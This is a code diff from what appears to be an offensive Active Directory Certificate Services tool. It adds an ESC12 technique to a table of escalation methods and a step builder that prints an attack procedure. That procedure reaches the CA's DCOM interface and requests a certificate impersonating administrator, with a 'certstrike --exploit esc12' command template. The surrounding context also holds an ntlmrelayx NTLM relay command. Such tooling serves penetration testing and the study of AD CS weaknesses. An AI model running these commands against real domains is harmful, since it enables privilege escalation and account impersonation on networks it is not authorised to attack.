@@ -34,6 +34,7 @@ var ESCDescription = map[string]struct {
 	"ESC9":      {"CT_FLAG_NO_SECURITY_EXTENSION (No Security Extension)", "UPN spoofing via certificate without requester SID", "Medium"},
 	"ESC10":     {"Weak Certificate Mapping (CertificateMappingMethods)", "Impersonation via weak UPN or S4U2Self certificate mapping", "Medium"},
 	"ESC11":     {"NTLM Relay to AD CS RPC Interface", "Relay NTLM auth to ICertPassage RPC for certificate issuance", "Medium"},
+	"ESC12":     {"DCOM interface abuse on CA with network HSM key storage", "Remote certificate enrollment via ICertRequest DCOM interface", "Medium"},
 	"ESC13":     {"OID group link — issuance policy linked to security group via msDS-OIDToGroupLink", "Privilege escalation via OID-to-group membership mapping", "Low"},
 	"ESC14":     {"Weak Explicit Mappings via altSecurityIdentities", "Impersonation via schema v1 templates with weak binding enforcement", "Medium"},
 }
@@ -163,6 +164,15 @@ func buildSteps(escType string, tmpl CertTemplate, cfg *ADCSConfig) []string {
 			"Relay coerced NTLM auth to the CA's RPC interface (ICertPassage/MS-ICPR)",
 			"Obtain certificate as the relayed principal",
 			fmt.Sprintf("Command: ntlmrelayx.py -t rpc://<CA_HOSTNAME> -rpc-mode ICPR -icpr-ca-name %q -smb2support", tmpl.Name),
+		}
+	case "ESC12":
+		return []string{
+			"Identify CA with DCOM endpoint mapper (port 135) remotely accessible",
+			"Confirm CA private key is stored on a network HSM or DCOM enrollment is unrestricted",
+			"Connect to ICertRequest DCOM interface on the CA server",
+			"Request certificate via DCOM — bypasses web enrollment and RPC restrictions",
+			fmt.Sprintf("Command: certstrike pki --exploit esc12 --template %s --upn administrator@%s --target-dc %s --domain %s",
+				tmpl.Name, cfg.Domain, cfg.TargetDC, cfg.Domain),
 		}
 	case "ESC14":
 		return []string{
